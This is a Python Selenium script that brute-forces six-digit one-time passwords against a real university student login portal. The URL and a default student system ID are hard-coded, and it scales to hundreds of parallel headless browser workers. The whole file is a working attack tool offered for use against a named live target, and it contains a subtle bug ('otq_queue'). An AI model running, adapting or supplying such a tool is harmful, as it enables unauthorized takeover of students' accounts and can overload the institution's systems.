from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
from webdriver_manager.chrome import ChromeDriverManager
from concurrent.futures import ThreadPoolExecutor, as_completed, ProcessPoolExecutor
import threading
import time
import sys
import requests
import random
from queue import Queue, Empty

class UltraScalableOTPBruteForcer:
    def __init__(self):
        self.found = threading.Event()
        self.correct_otp = None
        self.attempts = 0
        self.lock = threading.Lock()
        self.otp_queue = Queue()
        self.active_drivers = 0
        self.driver_lock = threading.Lock()
        
    def setup_driver_ultra_light(self):
        """Ultra-lightweight driver setup for massive scaling"""
        chrome_options = Options()
        chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--disable-extensions")
        chrome_options.add_argument("--disable-images")
        chrome_options.add_argument("--disable-javascript")  # Faster without JS
        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
        chrome_options.add_argument("--disable-background-timer-throttling")
        chrome_options.add_argument("--disable-renderer-backgrounding")
        chrome_options.add_argument("--disable-backgrounding-occluded-windows")
        chrome_options.add_argument("--memory-pressure-off")
        chrome_options.add_argument("--max_old_space_size=512")
        
        # Reduce timeouts
        chrome_options.add_argument("--aggressive-cache-discard")
        chrome_options.add_argument("--disable-features=VizDisplayCompositor")
        chrome_options.add_argument("--disable-ipc-flooding-protection")
        
        try:
            service = Service(ChromeDriverManager().install())
            service.creationflags = 0x08000000  # Reduce resource usage on Windows
            
            driver = webdriver.Chrome(
                service=service,
                options=chrome_options
            )
            
            # Set very short timeouts
            driver.set_page_load_timeout(10)
            driver.implicitly_wait(2)
            
            with self.driver_lock:
                self.active_drivers += 1
                
            return driver
        except Exception as e:
            print(f"❌ Driver setup failed: {e}")
            return None

    def ultra_fast_success_detection(self, driver):
        """Ultra-fast detection focusing only on critical elements"""
        try:
            # Method 1: Quick check for login form absence (fastest)
            try:
                driver.find_element(By.ID, "otp")
                return False  # Login form still exists = failure
            except NoSuchElementException:
                pass
            
            # Method 2: Quick check for any dashboard element
            dashboard_indicators = [
                ".studentssdashboard",
                ".ultimetelbe1", 
                ".placement-header",
                "nav.navdrop"
            ]
            
            for indicator in dashboard_indicators:
                try:
                    element = driver.find_element(By.CSS_SELECTOR, indicator)
                    if element.is_displayed():
                        return True
                except:
                    continue
            
            # Method 3: Check URL change
            current_url = driver.current_url.lower()
            if "home" in current_url or "dashboard" in current_url:
                return True
                
            return False
            
        except Exception as e:
            return False

    def attempt_login_ultra_fast(self, driver, otp_str, system_id="2024506431"):
        """Ultra-fast login attempt with minimal overhead"""
        try:
            # Quick navigation
            driver.get("https://student.sharda.ac.in/admin")
            
            # Fast form fill (no waiting for elements)
            try:
                sys_id_box = driver.find_element(By.ID, "system_id")
                otp_box = driver.find_element(By.ID, "otp")
                login_btn = driver.find_element(By.XPATH, '//*[@id="studentloginForm"]/ul/li[4]/button')
                
                sys_id_box.send_keys(system_id)
                otp_box.send_keys(otp_str)
                login_btn.click()
            except:
                return False
            
            # Very short wait
            time.sleep(1.5)
            
            # Ultra-fast detection
            return self.ultra_fast_success_detection(driver)
            
        except Exception as e:
            return False

    def worker_ultra_light(self, worker_id, batch_size=100):
        """Ultra-light worker that processes batches"""
        driver = None
        processed = 0
        
        try:
            while not self.found.is_set() and processed < batch_size:
                try:
                    # Get OTP from queue
                    try:
                        otp = self.otp_queue.get_nowait()
                    except Empty:
                        break
                    
                    otp_str = str(otp).zfill(6)
                    
                    # Create driver if needed (reuse for batch)
                    if driver is None:
                        driver = self.setup_driver_ultra_light()
                        if driver is None:
                            continue
                    
                    # Attempt login
                    if self.attempt_login_ultra_fast(driver, otp_str):
                        with self.lock:
                            self.found.set()
                            self.correct_otp = otp_str
                        print(f"\n🎉 WORKER-{worker_id}: FOUND OTP: {otp_str}")
                        break
                    
                    processed += 1
                    with self.lock:
                        self.attempts += 1
                    
                    # Report progress occasionally
                    if processed % 20 == 0:
                        print(f"👷 Worker {worker_id} processed: {processed} (Total: {self.attempts})")
                    
                    # Restart driver every 50 attempts to prevent memory leaks
                    if processed % 50 == 0 and driver:
                        driver.quit()
                        driver = None
                        time.sleep(0.1)  # Brief pause
                        
                except Exception as e:
                    if driver:
                        try:
                            driver.quit()
                        except:
                            pass
                        driver = None
                    continue
                    
        except Exception as e:
            print(f"⚠️ Worker {worker_id} fatal error: {e}")
        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    pass
            with self.driver_lock:
                self.active_drivers -= 1

    def massive_scale_attack(self, start_otp, end_otp, max_workers=200, system_id="2024506431"):
        """Massively scalable attack with hundreds of workers"""
        print(f"🚀 MASSIVE SCALE OTP BRUTE FORCE")
        print(f"📊 Range: {start_otp:06d} to {end_otp:06d}")
        print(f"🔢 Max Workers: {max_workers}")
        print(f"⚡ Strategy: Ultra-lightweight drivers with batching")
        print("-" * 70)
        
        # Fill queue
        for otp in range(start_otp, end_otp + 1):
            self.otp_queue.put(otp)
        
        total_otps = end_otp - start_otp + 1
        start_time = time.time()
        
        # Calculate optimal batch size based on worker count
        batch_size = max(50, total_otps // (max_workers * 2))
        
        print(f"📦 Batch size: {batch_size} OTPs per worker")
        print(f"🎯 Starting attack with {max_workers} workers...")
        
        completed_workers = 0
        last_report = time.time()
        
        try:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                # Submit initial batch of workers
                futures = []
                for i in range(min(max_workers, total_otps // batch_size + 1)):
                    if self.found.is_set():
                        break
                    future = executor.submit(self.worker_ultra_light, i, batch_size)
                    futures.append(future)
                
                # Monitor progress and submit new workers as needed
                while not self.found.is_set() and (self.attempts < total_otps or any(not f.done() for f in futures)):
                    time.sleep(2)
                    
                    current_time = time.time()
                    if current_time - last_report >= 10:
                        elapsed = current_time - start_time
                        rate = self.attempts / elapsed if elapsed > 0 else 0
                        remaining = total_otps - self.attempts
                        eta = remaining / rate / 60 if rate > 0 else 0
                        
                        print(f"📈 Progress: {self.attempts:,}/{total_otps:,} | "
                              f"Rate: {rate:.1f}/sec | "
                              f"Active: {self.active_drivers} | "
                              f"ETA: {eta:.1f} min")
                        last_report = current_time
                    
                    # Submit new workers if queue still has items and we have capacity
                    current_futures = [f for f in futures if not f.done()]
                    if (len(current_futures) < max_workers * 0.8 and 
                        not self.otp_queue.empty() and 
                        not self.found.is_set()):
                        for i in range(min(10, max_workers - len(current_futures))):
                            if self.otq_queue.empty() or self.found.is_set():
                                break
                            future = executor.submit(self.worker_ultra_light, len(futures), batch_size)
                            futures.append(future)
                
                # Wait for completion
                for future in as_completed(futures):
                    try:
                        future.result(timeout=1)
                    except:
                        pass
                    if self.found.is_set():
                        break
                        
        except KeyboardInterrupt:
            print(f"\n⏹️ Process interrupted by user")
        except Exception as e:
            print(f"\n❌ System error: {e}")
        finally:
            elapsed = time.time() - start_time
            print(f"\n" + "="*70)
            print(f"📊 FINAL RESULTS:")
            print(f"   Attempts: {self.attempts:,}")
            print(f"   Time: {elapsed:.2f} seconds")
            if elapsed > 0:
                print(f"   Speed: {self.attempts/elapsed:.1f} OTPs/second")
                print(f"   Peak rate: {self.attempts/elapsed*60:.0f} OTPs/minute")
            
            if self.found.is_set():
                print(f"🎉 SUCCESS! Valid OTP: {self.correct_otp}")
            else:
                print("❌ OTP not found in the specified range")

    def progressive_scaling_attack(self, start_otp, end_otp, system_id="2024506431"):
        """Progressively scales up workers to find optimal performance"""
        print(f"🚀 PROGRESSIVE SCALING ATTACK")
        print(f"📊 Range: {start_otp:06d} to {end_otp:06d}")
        print("⚡ Strategy: Auto-scaling workers for optimal performance")
        print("-" * 70)
        
        # Test different worker counts to find optimal
        worker_levels = [50, 100, 200, 300, 500]
        
        for worker_count in worker_levels:
            if self.found.is_set():
                break
                
            print(f"\n🔧 Testing with {worker_count} workers...")
            self.attempts = 0  # Reset counter for this test
            start_time = time.time()
            
            # Fill queue for this test
            for otp in range(start_otp, end_otp + 1):
                self.otp_queue.put(otp)
            
            self.massive_scale_attack(start_otp, end_otp, worker_count, system_id)
            
            if self.found.is_set():
                break
                
            # Clear queue for next test
            while not self.otp_queue.empty():
                try:
                    self.otp_queue.get_nowait()
                except Empty:
                    break

def get_user_input():
    """Get user input with massive scaling options"""
    print("🔐 ULTRA-SCALE SHARDA OTP BRUTE FORCE")
    print("=" * 60)
    
    # System ID
    system_id = input("Enter System ID [2024506431]: ").strip()
    if not system_id:
        system_id = "2024506431"
    
    # OTP Range
    print("\n📝 OTP RANGE (000000 to 999999)")
    while True:
        try:
            start_input = input("Start OTP [000000]: ").strip()
            end_input = input("End OTP [999999]: ").strip()
            
            start = int(start_input) if start_input else 0
            end = int(end_input) if end_input else 999999
            
            if start < 0 or end > 999999 or start > end:
                print("❌ Invalid range. Use 000000-999999")
                continue
                
            total = end - start + 1
            print(f"✅ Range: {start:06d} to {end:06d} ({total:,} OTPs)")
            break
            
        except ValueError:
            print("❌ Please enter valid numbers")
    
    # Scaling Strategy
    print("\n⚡ SCALING STRATEGY:")
    print("1. Massive Scale (200 workers) - Balanced")
    print("2. Ultra Scale (500 workers) - Maximum")
    print("3. Progressive Scaling - Auto-optimize")
    print("4. Custom Workers")
    
    while True:
        choice = input("Choice [1]: ").strip()
        if not choice:
            choice = "1"
            
        if choice == "1":
            return system_id, start, end, "massive", 200
        elif choice == "2":
            return system_id, start, end, "ultra", 500
        elif choice == "3":
            return system_id, start, end, "progressive", None
        elif choice == "4":
            workers = input("Number of workers [100]: ").strip()
            workers = int(workers) if workers else 100
            return system_id, start, end, "custom", workers
        else:
            print("❌ Enter 1-4")

def main():
    """Main function"""
    try:
        # Get user input
        system_id, start, end, strategy, workers = get_user_input()
        
        # Create attacker
        attacker = UltraScalableOTPBruteForcer()
        
        # Execute based on strategy
        if strategy == "massive":
            attacker.massive_scale_attack(start, end, workers, system_id)
        elif strategy == "ultra":
            attacker.massive_scale_attack(start, end, workers, system_id)
        elif strategy == "progressive":
            attacker.progressive_scaling_attack(start, end, system_id)
        else:  # custom
            attacker.massive_scale_attack(start, end, workers, system_id)
            
    except KeyboardInterrupt:
        print("\n\n⏹️ Operation cancelled by user")
    except Exception as e:
        print(f"\n❌ Fatal error: {e}")

if __name__ == "__main__":
    main()